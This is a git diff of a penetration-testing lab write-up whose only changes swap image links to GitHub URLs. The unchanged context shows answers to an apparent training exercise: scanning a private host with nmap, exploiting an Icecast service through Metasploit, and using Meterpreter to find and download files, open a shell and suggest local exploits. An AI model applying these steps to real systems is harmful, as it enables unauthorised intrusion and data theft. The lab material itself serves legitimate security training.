@@ -60,7 +60,7 @@ You've been provided full access to the network and are getting ping responses f
 
       > Answer:  nmap -sV 192.168.0.20
 
-       ![nmap](https://github.com/iastoneCO/Images.git/Images/nmap-ip-address.jpg)
+       ![nmap](https://github.com/iastoneCO/Images/blob/7f94bcef77fd01758dcea532b10b6635492d97f2/nmap-ip-address.jpg)
  
  
 2. From the previous step, we see that the Icecast service is running. Let's start by attacking that service. Search for any Icecast exploits:
@@ -69,7 +69,7 @@ You've been provided full access to the network and are getting ping responses f
                                
      > Answer: searchsploit icecast
 
-     ![searchsploit-icecase](Images/searchsploit-icecase.jpg)
+     ![searchsploit-icecase](https://github.com/iastoneCO/Images/blob/7f94bcef77fd01758dcea532b10b6635492d97f2/searchsploit-icecase.jpg)
 
 3. Now that we know which exploits are available to us, let's start Metasploit:
  
@@ -85,7 +85,7 @@ You've been provided full access to the network and are getting ping responses f
      
      > Answer: search icecast 
 
-     ![searchicecast](Images/msfconsole-searchicecast.jpg)
+     ![searchicecast](https://github.com/iastoneCO/Images/blob/7f94bcef77fd01758dcea532b10b6635492d97f2/msfconsole-searchicecast.jpg)
 
                       
  
@@ -103,7 +103,7 @@ You've been provided full access to the network and are getting ping responses f
       
      > Answer: set RHOST 192.168.0.20
 
-     ![RHOST](Images/rhostoptions.jpg)
+     ![RHOST](https://github.com/iastoneCO/Images/blob/7f94bcef77fd01758dcea532b10b6635492d97f2/rhostoptions.jpg)
  
 6. Run the Icecast exploit.
  
@@ -116,7 +116,7 @@ You've been provided full access to the network and are getting ping responses f
      > Answer: search -f *searchfile*.txt
 	(c:\Users\IEUser\Documents\user.secretfile.txt (161 bytes)
 
-        ![secretfile](Images/secretfile.jpg)
+        ![secretfile](https://github.com/iastoneCO/Images/blob/7f94bcef77fd01758dcea532b10b6635492d97f2/secretfile.jpg)
   
  7. You should now have a Meterpreter session open.
  
@@ -126,7 +126,7 @@ You've been provided full access to the network and are getting ping responses f
 	(c:\User\IEUser\Documents\Drinks.recipe.txt (48 bytes)
               
 
-        ![recipe](Images/Drinksrecipe.jpg)
+        ![recipe](https://github.com/iastoneCO/Images/blob/7f94bcef77fd01758dcea532b10b6635492d97f2/Drinksrecipe.jpg)
 
          
  
@@ -134,7 +134,7 @@ You've been provided full access to the network and are getting ping responses f
 
       > Answer: Download ‘c:\User\IEUser\Documents\Drinks.recipe.txt’
 
-      ![download](Images/download-recipe-text.jpg)
+      ![download](https://github.com/iastoneCO/Images/blob/7f94bcef77fd01758dcea532b10b6635492d97f2/download-recipe-text.jpg)
  
 
 8. You can also use Meterpreter's local exploit suggester to find possible exploits.
@@ -142,7 +142,7 @@ You've been provided full access to the network and are getting ping responses f
   
                   Run post/multi/recon/local_exploit_suggester
 
-       ![local](Images/local-exploit-suggester.jpg)
+       ![local](https://github.com/iastoneCO/Images/blob/7f94bcef77fd01758dcea532b10b6635492d97f2/local-exploit-suggester.jpg)
 
 #### Bonus
   
@@ -155,12 +155,13 @@ A. Run a Meterpreter post script that enumerates all logged on users.
 B. Open a Meterpreter shell and gather system information for the target.
  
   > Answer: shell and sysinfo
-  ![shell](Images/shell-1.jpg)
-  ![shell](Images/sysinfo.jpg)
+  > 
+  ![shell](https://github.com/iastoneCO/Images/blob/7f94bcef77fd01758dcea532b10b6635492d97f2/shell-1.jpg)
+  ![shell](https://github.com/iastoneCO/Images/blob/7f94bcef77fd01758dcea532b10b6635492d97f2/sysinfo.jpg)
                          
  
 C. Run the command that displays the target's computer system information:
 
    > Answer:  systeminfo  
 
- ![hostname](Images/hostname.jpg)
+ ![hostname](https://github.com/iastoneCO/Images/blob/7f94bcef77fd01758dcea532b10b6635492d97f2/hostname.jpg)
